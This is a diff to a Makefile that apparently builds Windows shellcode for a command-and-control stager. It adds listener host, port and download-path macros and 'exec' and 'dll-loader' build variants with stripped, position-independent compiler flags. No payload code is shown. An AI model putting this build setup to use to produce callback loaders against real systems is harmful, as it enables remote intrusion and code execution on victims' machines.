@@ -1,17 +1,23 @@
 CCX64 = x86_64-w64-mingw32-g++
 CCX86 = i686-w64-mingw32-g++
 
-CFLAGS = -Os -masm=intel -nostdlib
+MACROS = -DLISTENER_HOST=\"$(LISTENER_HOST)\" -DLISTENER_PORT=$(LISTENER_PORT)
+MACROS += -DREQUEST_PATH_DOWNLOAD=\"$(REQUEST_PATH_DOWNLOAD)\"
+
+CFLAGS = -g $(MACROS)
+CFLAGS += -Os -masm=intel -nostdlib
 CFLAGS += -s -ffunction-sections -fno-ident -fno-asynchronous-unwind-tables -w
 CFLAGS += -fpack-struct=8 -falign-labels=1 -falign-jumps=1 -fPIC
 CFLAGS += -Wl,-Tscript/linker.ld
 CFLAGS += -Wl,-s,--no-seh,--enable-stdcall-fixup
 
-MACROS = -DLISTENER_HOST=\"$(LISTENER_HOST)\" -DLISTENER_PORT=$(LISTENER_PORT) -DLISTENER_PATH=\"$(LISTENER_PATH)\"
+ifeq ($(SHELLCODE_TYPE),exec)
+	SOURCE = src/core/*.cpp src/main/entry_exec.cpp
+else ifeq ($(SHELLCODE_TYPE),dll-loader)
+	SOURCE = src/core/*.cpp src/main/entry_dll_loader.cpp
+endif
 
-SOURCE = src/core/*.cpp src/entry.cpp
-
-OUTTEMP = build/tmp.exe
+OUTTEMP = build/tmp.dll
 OUTFILE = ${OUTPUT}
 
 amd64: clean
